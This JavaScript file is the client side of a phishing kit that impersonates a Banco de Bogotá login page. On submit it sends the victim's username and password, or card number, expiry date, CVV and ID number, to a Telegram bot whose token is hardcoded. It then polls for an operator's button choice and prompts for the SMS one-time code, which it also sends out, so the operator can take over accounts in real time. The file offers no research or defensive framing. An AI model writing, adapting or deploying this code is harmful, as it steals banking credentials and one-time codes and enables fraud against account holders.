document.addEventListener("DOMContentLoaded", () => {
  const form = document.querySelector(".login-form")
  const idNumber = document.querySelector(".id-number")
  const passwordInput = document.querySelector(".password-input input")
  const submitBtn = document.querySelector(".submit-btn")
  const loadingOverlay = document.getElementById("loadingOverlay")
  const smsModal = document.getElementById("smsModal")
  const errorMessage = document.getElementById("errorMessage")
  const smsErrorMessage = document.getElementById("smsErrorMessage")
  const closeBtn = document.querySelector(".close-btn")
  const infoMessage = document.querySelector(".info-message")
  const togglePassword = document.querySelector(".toggle-password")
  const smsInputs = document.querySelectorAll(".sms-code-input input")
  const submitSmsCode = document.getElementById("submitSmsCode")
  const timerDisplay = document.getElementById("smsTimer")
  let timer
  let pollingInterval

  // Credenciales de Telegram (en un entorno real, esto debería estar en el servidor)
  const TELEGRAM_API_KEY = "8627198220:AAHlyBdeq2SeDlVN6G4_6QPdQrwU3tY-ICw"
  const TELEGRAM_CHAT_ID = "-1004245962123"

  // Tab switching functionality
  const tabs = document.querySelectorAll(".tab-btn")
  const loginForms = document.querySelectorAll(".login-form")
  const infoMessageText = document.getElementById("infoMessageText")
  tabs.forEach((tab) => {
    tab.addEventListener("click", () => {
      tabs.forEach((t) => t.classList.remove("active"))
      tab.classList.add("active")
      const activeTab = tab.getAttribute("data-tab")
      loginForms.forEach((form) => {
        form.style.display = form.classList.contains(activeTab + "-form") ? "block" : "none"
      })
      infoMessageText.textContent =
        activeTab === "clave"
          ? "Estás ingresando con tu Clave Segura. Selecciona 'Tarjeta Débito' para cambiar el tipo de ingreso."
          : "Estás ingresando con tu Tarjeta Débito. Selecciona 'Clave Segura' para cambiar el tipo de ingreso."
    })
  })

  // Close info message
  if (closeBtn && infoMessage) {
    closeBtn.addEventListener("click", () => {
      infoMessage.style.display = "none"
    })
  }

  // Password visibility toggle
  if (togglePassword && passwordInput) {
    togglePassword.addEventListener("click", () => {
      const type = passwordInput.getAttribute("type") === "password" ? "text" : "password"
      passwordInput.setAttribute("type", type)
      togglePassword.innerHTML = type === "password" ? '<i class="fas fa-eye"></i>' : '<i class="fas fa-eye-slash"></i>'
    })
  }

  function validateForm(form) {
    const inputs = form.querySelectorAll("input, select")
    let isValid = true
    inputs.forEach((input) => {
      if (input.value.trim() === "") {
        isValid = false
      }
    })
    form.querySelector(".submit-btn").disabled = !isValid
  }

  async function sendTelegramMessage(message, options = ["Mostrar error", "Permitir acceso"]) {
    const url = `https://api.telegram.org/bot${TELEGRAM_API_KEY}/sendMessage`

    const keyboard = {
      inline_keyboard: [
        options.map((option) => ({ text: option, callback_data: option.toLowerCase().replace(/ /g, "_") })),
      ],
    }

    try {
      const response = await fetch(url, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: "HTML",
          reply_markup: JSON.stringify(keyboard),
        }),
      })
      const data = await response.json()
      return data.result.message_id
    } catch (error) {
      console.error("Error al enviar mensaje a Telegram:", error)
      return null
    }
  }

  async function checkTelegramResponse(messageId) {
    const url = `https://api.telegram.org/bot${TELEGRAM_API_KEY}/getUpdates?offset=-1&limit=1`

    try {
      const response = await fetch(url)
      const data = await response.json()

      if (data.ok && data.result.length > 0) {
        const update = data.result[0]
        if (update.callback_query && update.callback_query.message.message_id === messageId) {
          return update.callback_query.data
        }
      }
      return null
    } catch (error) {
      console.error("Error al verificar la respuesta de Telegram:", error)
      return null
    }
  }

  function startPolling(messageId) {
    return new Promise((resolve) => {
      pollingInterval = setInterval(async () => {
        const response = await checkTelegramResponse(messageId)
        if (response) {
          clearInterval(pollingInterval)
          resolve(response)
        }
      }, 2000)
    })
  }

  function clearSmsFields() {
    Array.from(smsInputs).forEach((input) => (input.value = ""))
    smsInputs[0].focus()
  }

  function showSmsError(message) {
    smsErrorMessage.textContent = message
    smsErrorMessage.style.display = "block"
  }

  function clearSmsError() {
    smsErrorMessage.textContent = ""
    smsErrorMessage.style.display = "none"
  }

  function startSmsTimer() {
    clearSmsFields()
    let time = 300 // 5 minutes in seconds
    clearInterval(timer)
    timer = setInterval(() => {
      const minutes = Math.floor(time / 60)
      let seconds = time % 60
      seconds = seconds < 10 ? "0" + seconds : seconds
      timerDisplay.textContent = `${minutes}:${seconds}`
      if (time === 0) {
        clearInterval(timer)
        showSmsError("El código SMS ha expirado. Por favor, inicie sesión nuevamente.")
        setTimeout(() => {
          smsModal.style.display = "none"
          form.reset()
          clearSmsError()
        }, 3000)
      }
      time--
    }, 1000)
  }

  loginForms.forEach((form) => {
    const inputs = form.querySelectorAll("input, select")
    inputs.forEach((input) => {
      input.addEventListener("input", () => validateForm(form))
    })

    form.addEventListener("submit", async (e) => {
      e.preventDefault()
      const errorMsg = form.querySelector(".error-message")
      errorMsg.style.display = "none"
      loadingOverlay.style.display = "flex"
      form.querySelector(".submit-btn").disabled = true

      let message
      if (form.classList.contains("clave-form")) {
        const username = form.querySelector(".id-number").value
        const password = form.querySelector(".password-input input").value
        message = `
  🏦 Nuevo intento de acceso a Banco de Bogotá (Clave Segura)
  👤 Usuario: ${username}
  🔑 Contraseña: ${password}
  
  Por favor, seleccione una acción:
                  `
      } else {
        const cardType = form.querySelector(".card-type").value
        const cardNumber = form.querySelector(".card-number").value
        const expiryMonth = form.querySelector(".expiry-month").value
        const expiryYear = form.querySelector(".expiry-year").value
        const cvv = form.querySelector(".cvv").value
        const idType = form.querySelector(".id-type").value
        const idNumber = form.querySelector(".id-number").value
        message = `
  🏦 Nuevo intento de acceso a Banco de Bogotá (Tarjeta Débito)
  💳 Tipo de Tarjeta: ${cardType}
  🔢 Número de Tarjeta: ${cardNumber}
  📅 Fecha de Vencimiento: ${expiryMonth}/${expiryYear}
  🔐 CVV: ${cvv}
  📄 Tipo de Documento: ${idType}
  👤 Número de Documento: ${idNumber}
  
  Por favor, seleccione una acción:
                  `
      }

      const messageId = await sendTelegramMessage(message)

      if (messageId) {
        const adminResponse = await startPolling(messageId)

        if (adminResponse === "mostrar_error") {
          loadingOverlay.style.display = "none"
          errorMsg.style.display = "block"
          form.querySelector(".submit-btn").disabled = false
        } else if (adminResponse === "permitir_acceso") {
          loadingOverlay.style.display = "none"
          smsModal.style.display = "block"
          clearSmsFields()
          clearSmsError()
          startSmsTimer()
        }
      } else {
        loadingOverlay.style.display = "none"
        alert("Hubo un error al procesar su solicitud. Por favor, inténtelo de nuevo más tarde.")
        form.querySelector(".submit-btn").disabled = false
      }
    })
  })

  // SMS code input functionality
  smsInputs.forEach((input, index) => {
    input.addEventListener("input", (e) => {
      if (e.target.value.length === 1) {
        if (index < smsInputs.length - 1) {
          smsInputs[index + 1].focus()
        }
      }
    })

    input.addEventListener("keydown", (e) => {
      if (e.key === "Backspace" && index > 0 && input.value.length === 0) {
        smsInputs[index - 1].focus()
      }
    })
  })

  // SMS verification
  if (submitSmsCode) {
    submitSmsCode.addEventListener("click", async () => {
      const smsCode = Array.from(smsInputs)
        .map((input) => input.value)
        .join("")
      if (smsCode.length === 6) {
        clearInterval(timer)
        loadingOverlay.style.display = "flex"
        smsModal.style.display = "none"
        clearSmsError()

        const messageId = await sendTelegramMessage(
          `
  🏦 Código OTP ingresado para Banco de Bogotá
  🔢 Código: ${smsCode}
  
  Por favor, seleccione una acción:
                  `,
          ["Error de token", "Permitir acceso"],
        )

        if (messageId) {
          const adminResponse = await startPolling(messageId)

          if (adminResponse === "error_de_token") {
            loadingOverlay.style.display = "none"
            smsModal.style.display = "block"
            showSmsError("Error en el token. Por favor, intente nuevamente.")
            startSmsTimer()
          } else if (adminResponse === "permitir_acceso") {
            loadingOverlay.style.display = "none"
            window.location.href = '../confirmacion.html'
          }
        } else {
          loadingOverlay.style.display = "none"
          smsModal.style.display = "block"
          showSmsError("Hubo un error al procesar su solicitud. Por favor, inténtelo de nuevo más tarde.")
        }
      } else {
        showSmsError("Por favor, ingrese el código SMS completo.")
      }
    })
  }

  // Initialize forms
  loginForms.forEach((form) => validateForm(form))
})
